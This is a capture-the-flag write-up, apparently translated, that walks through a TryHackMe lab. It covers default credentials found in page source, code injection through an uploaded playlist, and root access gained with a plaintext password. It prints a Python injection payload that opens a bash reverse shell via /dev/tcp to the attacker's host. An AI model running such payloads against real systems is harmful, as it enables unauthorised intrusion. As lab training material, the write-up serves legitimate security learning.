> *This translation has been made by Claude, check out the original writeup [here](readme.md).*

# Beach Bar

![Screenshot](img/Pasted%20image%2020260821105306.png)

https://tryhackme.com/room/hh-beachbar-d849f7f7
## Introduction
> Welcome back to the Byte Lotus — this time the sand is warm, the deck lights are coming up, and the beach bar's jukebox takes requests from anyone with a phone. You spend the evening as a guest at the rail who simply notices things: a DJ who never logs out, a song queue that accepts a little more than song titles, a service down the boardwalk quietly announcing "something".

> The beachside guest-experience build shipped on a deadline, and the night-shift developer wired the jukebox straight into the floor with the trimmings still attached.

![Screenshot](img/Pasted%20image%2020260821105424.png)
## Initial Recon

Port 80 is open

![Screenshot](img/Pasted%20image%2020260821112912.png)

The site serves up a login form

![Screenshot](img/Pasted%20image%2020260821110611.png)

Checked the source and saw a comment lighting up the whole screen

![Screenshot](img/Pasted%20image%2020260821110857.png)

`dj:dj`, well how nice.

Once logged in it looks like this:

![Screenshot](img/Pasted%20image%2020260821110952.png)

So we can download the playlist, edit it and upload it again. How about editing it in a way that gives us access to the server? Should work.

The playlist looks like this:

![Screenshot](img/Pasted%20image%2020260821111248.png)

Chose to upload the same list again just to see what happens:

![Screenshot](img/Pasted%20image%2020260821111500.png)

Can you upload a file that isn't `.yml`?

Text files are fine, but not e.g. `jpg`

![Screenshot](img/Pasted%20image%2020260821112747.png)

Maybe upload some script that runs in the browser?

A POC shows that we can read out files:

![Screenshot](img/Pasted%20image%2020260821113431.png)

![Screenshot](img/Pasted%20image%2020260821113443.png)

whoami says we are `bartender` and in the home directory the flag is found:

<details>
  <summary><b>Click here to see the flag</b></summary>

   ![Screenshot](img/Pasted%20image%2020260821113708.png)
</details>

## Escalation
Did some small tests - it's possible to create files in the home directory (with `touch` or `echo` to file). So, it should be possible to arrange a reverse shell?

Started a listener on my machine with `nc`, then sent the following into the form:

`"__import__('os').popen('bash -c \"bash -i >& /dev/tcp/192.168.x.x/4444 0>&1\"').read()"`

And got a connection

![Screenshot](img/Pasted%20image%2020260821121007.png)

Upgraded my shell and after poking around the system found an interesting file, `jukeboxd.py`

![Screenshot](img/Pasted%20image%2020260821124002.png)

It wants a `stream-pass` to be able to run, a password I stumbled across in another search:

![Screenshot](img/Pasted%20image%2020260821124104.png)

There you can see the password in plaintext, namely `SunsetSpritz2024!`.

Tried running `sudo -l` for bartender, but it was the wrong password. Kept looking around the filesystem, then it struck me, does the password work with `su root`?

The answer is yes :D

<details>
  <summary><b>Click here to see the flag</b></summary>

   ![Screenshot](img/Pasted%20image%2020260821123708.png)
</details>

Happy Hacking!
